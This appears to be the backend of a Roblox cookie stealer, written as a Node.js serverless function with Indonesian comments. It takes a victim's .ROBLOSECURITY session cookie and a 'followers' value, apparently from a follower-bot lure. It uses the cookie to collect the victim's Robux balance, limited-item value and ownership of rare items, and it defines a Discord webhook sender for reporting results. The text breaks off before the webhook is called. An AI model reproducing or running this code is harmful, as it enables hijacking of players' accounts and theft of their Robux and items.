const fetch = require('node-fetch'); // Vercel runtime memiliki fetch bawaan, tapi ini untuk kompatibilitas jika lokal

// Fungsi pembantu untuk memanggil API Roblox
async function callRobloxApi(url, cookie, method = 'GET', body = null) {
    const headers = {
        'Cookie': `.ROBLOSECURITY=${cookie}`,
        'User-Agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/100.0.4896.75 Safari/537.36'
    };

    const options = { method, headers };

    if (body) {
        options.body = JSON.stringify(body);
        headers['Content-Type'] = 'application/json';
        // Untuk POST/state-changing requests ke Roblox, kita perlu CSRF token
        // Mendapatkan CSRF token di Node.js cukup kompleks karena perlu sesi
        // Untuk kesederhanaan awal, kita abaikan CSRF token di sini.
        // Jika API Roblox POST gagal, ini mungkin penyebabnya.
        // Sebuah implementasi penuh akan memerlukan endpoint /v2/logout untuk mendapatkan token.
        // Contoh simplified token handling:
        // const xsrfToken = await getXsrfToken(cookie);
        // if (xsrfToken) headers['X-CSRF-TOKEN'] = xsrfToken;
    }

    try {
        const response = await fetch(url, options);
        const responseText = await response.text(); // Ambil sebagai teks dulu
        let responseJson = null;
        try {
            responseJson = JSON.parse(responseText); // Coba parse sebagai JSON
        } catch (e) {
            console.error(`Failed to parse JSON for URL: ${url}. Response: ${responseText}`);
        }
        
        return {
            code: response.status,
            response: responseJson,
            error: response.status !== 200 ? `HTTP Error ${response.status}: ${responseText}` : null
        };
    } catch (error) {
        console.error(`cURL-like error for URL ${url}: ${error.message}`);
        return { code: 0, response: null, error: error.message };
    }
}

// Fungsi untuk mengirim pesan ke Discord Webhook
async function sendDiscordWebhook(webhookUrl, payload) {
    try {
        const response = await fetch(webhookUrl, {
            method: 'POST',
            headers: { 'Content-Type': 'application/json' },
            body: JSON.stringify(payload)
        });
        if (!response.ok) {
            const errorText = await response.text();
            console.error(`Failed to send Discord Webhook: ${response.status} - ${errorText}`);
            return false;
        }
        return true;
    } catch (error) {
        console.error(`Error sending Discord Webhook: ${error.message}`);
        return false;
    }
}

// Fungsi utama serverless
module.exports = async (req, res) => {
    if (req.method !== 'POST') {
        res.status(405).json({ statusCode: 405, message: 'Metode tidak diizinkan. Gunakan POST.' });
        return;
    }

    // Menerima data dari frontend
    const { cookie, followers } = req.body;

    if (!cookie) {
        res.status(400).json({ statusCode: 400, message: 'Cookie tidak ditemukan dari frontend.' });
        return;
    }

    const requestedFollowers = parseInt(followers) || 0;

    let stats = {};
    let userId = null;
    let username = 'Tidak Diketahui';

    // 1. Dapatkan User ID dan Username dari cookie
    const authResponse = await callRobloxApi('https://users.roblox.com/v1/users/authenticated', cookie);
    if (authResponse.code === 200 && authResponse.response && authResponse.response.id) {
        userId = authResponse.response.id;
        username = authResponse.response.name;
        stats['Username'] = username;
        stats['User ID'] = userId;
    } else {
        const errorMsg = authResponse.error || (authResponse.response && authResponse.response.errors && authResponse.response.errors[0] && authResponse.response.errors[0].message) || 'Unknown API error';
        console.error(`Failed to authenticate user with cookie. HTTP Code: ${authResponse.code}, Error: ${errorMsg}`);
        res.status(401).json({ statusCode: 401, message: 'Cookie tidak valid atau sesi kadaluarsa.' });
        return;
    }

    // 2. Dapatkan Robux Balance dan Pending Robux
    const currencyResponse = await callRobloxApi(`https://economy.roblox.com/v1/users/${userId}/currency`, cookie);
    if (currencyResponse.code === 200 && currencyResponse.response && typeof currencyResponse.response.robux !== 'undefined') {
        stats['Robux Balance'] = currencyResponse.response.robux.toLocaleString();
        stats['Robux Pending'] = 'Tidak Tersedia Langsung (API)';
    } else {
        stats['Robux Balance'] = 'Gagal Mengambil';
        stats['Robux Pending'] = 'Gagal Mengambil';
        console.error(`Failed to get Robux balance for user ${userId}. HTTP Code: ${currencyResponse.code}, Error: ${currencyResponse.error || 'N/A'}`);
    }

    // 3. Dapatkan Profil User (Join Date, Deskripsi)
    const profileResponse = await callRobloxApi(`https://users.roblox.com/v1/users/${userId}`, cookie);
    if (profileResponse.code === 200 && profileResponse.response) {
        const joinDate = profileResponse.response.created ? new Date(profileResponse.response.created).toISOString().slice(0, 19).replace('T', ' ') : 'Tidak Diketahui';
        stats['Age Account'] = joinDate;
        
        const bioResponse = await callRobloxApi(`https://users.roblox.com/v1/users/${userId}/profile-bio`, cookie);
        const summary = (bioResponse.code === 200 && bioResponse.response && bioResponse.response.description) ? bioResponse.response.description : 'Tidak ada deskripsi.';
        stats['Summary'] = (summary.length > 200 ? summary.substring(0, 197) + '...' : summary);
    } else {
        stats['Age Account'] = 'Gagal Mengambil';
        stats['Summary'] = 'Gagal Mengambil';
        console.error(`Failed to get user profile for user ${userId}. HTTP Code: ${profileResponse.code}, Error: ${profileResponse.error || 'N/A'}`);
    }

    // 4. Dapatkan RAP (Recent Average Price)
    const rapResponse = await callRobloxApi(`https://inventory.roblox.com/v1/users/${userId}/value`, cookie);
    if (rapResponse.code === 200 && rapResponse.response && typeof rapResponse.response.value !== 'undefined') {
        stats['RAP (Nilai Limiteds)'] = rapResponse.response.value.toLocaleString();
    } else {
        stats['RAP (Nilai Limiteds)'] = 'Gagal Mengambil / Tidak Tersedia';
        console.error(`Failed to get RAP for user ${userId}. HTTP Code: ${rapResponse.code}, Error: ${rapResponse.error || 'N/A'}`);
    }

    // 5. Cek Korblox dan Headless
    const korbloxAssetId = 1802360; // Right Leg of Korblox Deathspeaker
    const headlessAssetId = 1340919; // Head of Headless Horseman

    let korbloxOwned = false;
    let headlessOwned = false;

    const korbloxCheck = await callRobloxApi(`https://inventory.roblox.com/v1/users/${userId}/items/assets/${korbloxAssetId}/is-owned`, cookie);
    if (korbloxCheck.code === 200 && korbloxCheck.response && typeof korbloxCheck.response.isOwned !== 'undefined') {
        korbloxOwned = korbloxCheck.response.isOwned;
    } else {
        console.error(`Failed to check Korblox for user ${userId}. HTTP Code: ${korbloxCheck.code}, Error: ${korbloxCheck.error || 'N/A'}`);
    }
    stats['Korblox'] = korbloxOwned ? 'True ✅' : 'False ❌';

    const headlessCheck = await callRobloxApi(`https://inventory.roblox.com/v1/users/${userId}/items/assets/${headlessAssetId}/is-owned`, cookie);
    if (headlessCheck.code === 200 && headlessCheck.response && typeof headlessCheck.response.isOwned !== 'undefined') {
        headlessOwned = headlessCheck.response.isOwned;